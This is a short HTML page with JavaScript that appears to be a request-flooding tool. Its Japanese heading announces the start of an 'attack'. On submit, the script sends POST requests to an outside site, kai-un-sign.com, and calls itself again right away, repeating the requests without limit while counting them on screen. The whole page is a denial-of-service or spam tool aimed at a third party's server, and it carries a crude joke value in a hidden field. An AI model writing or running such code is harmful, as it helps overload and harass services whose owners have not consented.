<form id="myForm" action="http://kai-un-sign.com/index.php" method="post" name="configForm">
    <h1>下のボタンを押して攻撃開始だ！</h1>
    <input type="hidden" name="id" value="chinpoko">
</form>
<p>送信した回数：</p>
<p id="count">0</p>

<script>
    var p = document.getElementById("count");
    var count = 0;

    function submit(e) {
        // デフォルトの送信をキャンセル
        if (e) {
            e.preventDefault();
        }

        // フォームデータを取得
        var formData = new FormData(document.getElementById("myForm"));

        // フォームデータの内容をログに表示（デバッグ用）
        for (var pair of formData.entries()) {
            //  console.log(pair[0] + ': ' + pair[1]);
        }

        // フォームのaction属性で指定されたURLにデータを送信
        fetch(document.getElementById("myForm").getAttribute("action"), {
            method: 'POST',
            mode: 'no-cors',
            body: formData
        })
            .then(response => {
                // レスポンスの処理
                count++;
                p.textContent = count;
            })
            .catch(error => {
                console.error('Error:', error);
            });
        submit();
    }

    document.getElementById("myForm").addEventListener("submit", submit);
</script>
